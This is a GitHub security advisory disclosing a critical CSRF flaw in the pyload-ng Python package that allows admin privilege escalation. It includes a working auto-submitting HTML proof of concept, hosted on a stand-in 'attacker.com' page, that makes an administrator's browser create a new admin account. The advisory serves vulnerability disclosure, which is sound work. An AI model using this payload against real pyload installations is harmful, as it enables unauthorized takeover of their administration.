# Cross-Site Request Forgery (CSRF) on any API call leading to admin privilege escalation

Critical

[GammaC0de](/GammaC0de)
published
GHSA-pgpj-v85q-h5fm
Jan 17, 2024

## Package

pip

pyload-ng
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 0.5.0b3.dev77

## Patched versions

None

## Description

### Summary

The `pyload` API allows any API call to be made using GET requests. Since the session cookie is not set to `SameSite: strict`, this opens the library up to severe attack possibilities via a Cross-Site Request Forgery (CSRF) attack. This proof of concept shows how an unauthenticated user could trick the administrator's browser into creating a new admin user.

### Details

The `pyload` API allows any API call to be made using GET requests. Since the session cookie is not set to `SameSite: strict`, this opens the library up to severe attack possibilities via a Cross-Site Request Forgery (CSRF) attack. This proof of concept shows how an unauthenticated user could trick the administrator's browser into creating a new admin user.

### PoC

We host the following HTML file on an attacker-controlled server.

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://localhost:8000/api/add_user/%22hacker%22,%22hacker%22">
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

If we now trick an administrator into visiting our malicious page at `https://attacker.com/CSRF.html`, we see that their browser will make a request to `/api/add_user/%22hacker%22,%22hacker%22`, adding a new administrator to the `pyload` application.

[![image](https://user-images.githubusercontent.com/44903767/294942232-d874e838-f8eb-492f-98df-2d16ba74ff25.png)](https://user-images.githubusercontent.com/44903767/294942232-d874e838-f8eb-492f-98df-2d16ba74ff25.png)

The attacker can now authenticate as this newly created administrator user with the username `hacker` and password `hacker`.

Any API call can be made via a CSRF attack by an unauthenticated user.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
